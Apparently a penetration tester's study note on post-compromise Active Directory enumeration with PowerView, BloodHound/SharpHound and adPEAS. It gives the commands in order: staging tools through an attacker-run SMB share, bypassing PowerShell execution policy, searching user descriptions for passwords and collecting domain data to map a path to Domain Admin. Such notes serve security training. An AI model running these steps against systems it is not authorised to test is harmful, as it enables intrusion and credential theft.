# Attacking AD: Post-Compromise Enumeration

## Introduction

* Once you have a compromise, how can you enumerate the network and increase your overall level of access?

### Tools

* PowerView -- AD Enumeration tool (PowerShell)
* BloodHound -- Graphical representation of AD environment
* SharpHound -- BloodHound's collector
* adPEAS -- Just a <mark style="color:yellow;">chad</mark> of a tool.

<mark style="color:yellow;">Make sure that you ALWAYS use a new and fresh version of BloodHound and SharpHound!</mark>

### Repos

PowerView:

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

BloodHound:&#x20;

{% embed url="https://github.com/BloodHoundAD/BloodHound/releases" %}

SharpHound (Collector):

{% embed url="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors" %}

adPEAS:

{% embed url="https://github.com/61106960/adPEAS" %}

## PowerView

Step 1: Transfer PowerView.ps1 on the target machine

Step 2: Set Execution Policy -- <mark style="color:yellow;">`powershell -ep bypass`</mark>

Step 3: Dot Sourcing -- <mark style="color:yellow;">`. .\PowerView.ps1`</mark>

Step 4: Start running commands!

Step 5: <mark style="color:yellow;">`Get-NetDomain`</mark>

Step 6: Get DC Info -- <mark style="color:yellow;">`Get-NetDomainController`</mark>

Step 7: Show domain policies -- <mark style="color:yellow;">`Get-DomainPolicy`</mark>

Step 8: User Info -- <mark style="color:yellow;">`Get-NetUser`</mark>

or just grab a list of domain users -- <mark style="color:yellow;">`Get-NetUser | select samaccountname`</mark>

Look for password in user descriptions -- <mark style="color:yellow;">`Get-NetUser | select description`</mark>

Step 9: Find Shares -- <mark style="color:yellow;">`Invoke-ShareFinder`</mark>

Step 10: Look at Group Policies -- <mark style="color:yellow;">`Get-NetGPO | select displayname, whenchanged`</mark>

### Cheat Sheet

{% embed url="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" %}

## BloodHound

Run Neo4j:

```
neo4j console
```

Run BloodHound:

```
bloodhound
```

* Type in username and password

### Grab Data w/ Invoke-BloodHound (Collector)

* You can utilize the PowerShell version of SharpHound for Invoking (SharpHound.ps1)

Transfer SharpHound to your target:

Kali:&#x20;

```
impacket-smbserver smb . -smb2support
```

Windows:&#x20;

```
net use \\kali-ip\smb
copy \\kali-ip\smb\SharpHound.ps1
```

Invoke-BloodHound:

```
. .\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All
```

* It will generate a zip file
* Obtain this zip file from the SMB file share that you created and drag and drop it into BloodHound

## Enumerating Domain Data w/ BloodHound

* Be sure to load up the pre-build queries and see what we have to do to get to DA
* Be sure to right-click on items for help with exploitation!

<mark style="color:yellow;">Should we look into custom queries?</mark>

{% embed url="https://github.com/hausec/Bloodhound-Custom-Queries" %}

Things to keep in mind:&#x20;

* You use PowerView to look for users, groups, group policies, computers, etc.
* BloodHound to look at administrators, high value targets, which members are administrators, etc.

## adPEAS

Step 1: Transfer script to Windows target (SMB server)

Step 2: Import and Invoke

```
Import-Module .\ADPeas.ps1

Invoke-ADPeas
```

Step 3: Go through slowly
